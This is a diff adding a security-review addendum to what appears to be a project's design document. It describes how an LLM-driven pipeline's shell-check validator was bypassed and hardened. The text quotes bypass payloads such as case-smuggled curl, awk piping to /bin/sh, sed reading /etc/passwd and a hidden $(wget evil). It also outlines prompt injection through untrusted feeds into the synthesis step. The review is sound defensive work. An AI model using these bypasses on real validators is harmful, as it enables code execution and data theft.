@@ -163,6 +163,111 @@ so anything still unpromoted re-proposes in later cycles and now merges
 automatically. For the same collision reason, the watchdog deliberately does
 NOT auto-merge stale promotion PRs; it escalates them to a human.
 
+## Addendum 2026-07-13: full security review (wall bypasses, liveness, hardening)
+
+A five-agent adversarial review plus hands-on exploitation found that the
+verification wall — the one control between untrusted internet feeds and shell
+code shipped to users — had multiple confirmed, reproduced bypasses. Because
+the downstream gates (TPR/FPR validation, adversarial loop) are author-
+controlled for a deliberately crafted candidate, the wall was effectively the
+sole real gate, and it leaked. Auto-publish was paused via the kill switch
+(`PRESTON_AUTOMERGE_ENABLED=false`) for the duration of the patch and restored
+after verification.
+
+### Wall bypasses found and closed
+
+Root cause: bashlex cannot parse `[[ -z ... ]]`, a construct in every generated
+check, so 100% of shipped checks were validated by the weaker regex fallback
+rather than the sound AST path. The fallback had several blind spots, each
+independently exploitable:
+
+Commands after `)` / shell keywords. A `case x in y) curl … ;; esac` — valid
+bash the fallback's command-start regex did not recognise — smuggled `curl`,
+`eval`, `rm` straight through. Fix: `[[ … ]]` is now normalised so bashlex
+parses real checks via the sound AST path, and any source bashlex still cannot
+parse (case/esac, coproc, line continuations) is REJECTED (fail closed) rather
+than passed to a weaker scan.
+
+awk/sed/cat/cut program-text escapes. `awk 'BEGIN{print "x" | "/bin/sh"}'`,
+`awk '{print > "/tmp/x"}'`, `sed '1e id'`, `sed 'w /tmp/x'`, `sed 'r /etc/passwd'`,
+and `cat /any/path` all passed — the AST walker never inspects a command's
+program-text argument. Zero shipped checks used any of these commands, so they
+were removed from the allowlist entirely (grep/rg/find cover static detection).
+The awk/sed program-text denylist patterns were also extended (output pipe,
+output redirection, sed e/w/r) as defence in depth.
+
+Command substitutions hidden in double quotes. The fallback blanked the
+interior of `"$(…)"`, so `x="$(wget evil)"` hid the denied command. Fix: every
+`$(…)` interior is now extracted and validated as its own command context —
+which also works around bashlex's inability to parse `||`/`&&` inside `$(…)`.
+
+A pre-existing false positive was fixed in the same pass: the ANSI-C-quoting
+pattern flagged the ubiquitous `grep -v '^$'` blank-line idiom (the `$'` there
+is a regex anchor plus a closing quote, not an ANSI-C opener).
+
+After the fixes: all 37 shipped checks validate via the sound AST path, the
+red-team harness reports catch rate 1.0 and legitimate pass rate 1.0 across 488
+attack variants, and the specific bypasses above are encoded as permanent
+regression fixtures in `tools/sandbox_redteam.py`.
+
+### Liveness gaps closed
+
+The watchdog swallowed SES send failures and exited 0 — a blind alert channel
+looked healthy. It now turns the run red when it cannot deliver an alert or
+when unresolved escalations remain. The auto-tag retry loop exited 0 when every
+attempt lost the tag-push race (no tag, no release, and nothing for the
+watchdog to notice); it now fails loudly. The orchestrate merge step now fails
+after retries instead of only warning. The ingest loop keeps its graceful
+per-source degradation but now fails when every source fails in one cycle.
+
+### Workflow hardening
+
+`lint-community.yml` no longer interpolates a PR-controlled filename list into
+a shell script (a path with quotes or `$(…)` was an injection vector); it flows
+through `env`. `workflow-lint.yml`'s actionlint bootstrap is pinned to an
+immutable release tag instead of `curl | bash` from `main`. `setup-homebrew`
+is pinned to a commit SHA instead of `@master`. `test.yml` gained an explicit
+read-only `permissions` block.
+
+### End-user runtime
+
+Auto-generated checks now run under a scrubbed environment (`env -i` with only
+PATH, HOME, LANG, SOURCE_DIR) so a check cannot read the user's cloud
+credentials or tokens even into local output — additional to the wall already
+blocking network and file writes. Verified against the 60-test behavioral
+harness and a real accepted check.
+
+### Residual items for owner decision (not unilaterally changed)
+
+These are product-threat-model or policy calls rather than clear bugs, so they
+are surfaced rather than silently changed:
+
+Untrusted-source auto-merge. Reddit / Mastodon / mailing-list content is
+attacker-influenceable free text. The wall stops malicious code, but a crafted
+input could still steer synthesis toward a semantically misleading check (for
+example a false-PASS that hides a real vulnerability class) — "injecting bad
+information" that a shell-safety gate cannot catch. TPR/FPR validation is a
+partial mitigation (the check must fire on the positive corpus). Recommended
+option: auto-merge only candidates corroborated by a reactive authoritative
+source (KEV/GHSA/NVD/OSV) and route proactive-text-only candidates to a review
+label. This changes promotion policy, so it is left for explicit sign-off.
+
+Structural prompt isolation. `synthesize.py` places candidate data in the LLM
+user message with prompt-based (not tool-argument) isolation. The wall is the
+primary control; moving candidate data into structured tool parameters would
+harden against prompt injection as defence in depth.
+
+CI candidate execution. `validate_candidate.py` / `adversarial_loop.py` execute
+the candidate on the same runner that holds the attestation signing key in
+`/tmp`. With the wall sound (no network, no arbitrary file write) exfiltration
+is blocked, but running candidate execution under the same `env -i` scrub and
+isolating the signing key would remove the residual.
+
+Auxiliary-loop push suppression. `drift-detection`, `rss-feed-discovery`, and
+`telemetry-aggregate` use `|| true` on their `git push`, so a lost report is
+silent. These are non-shipping maintenance loops; hardening them is lower
+priority than the ship path but noted for completeness.
+
 ## Verification record (2026-07-12)
 
 actionlint clean across all workflow files after the fixes. Watchdog dry-run executed
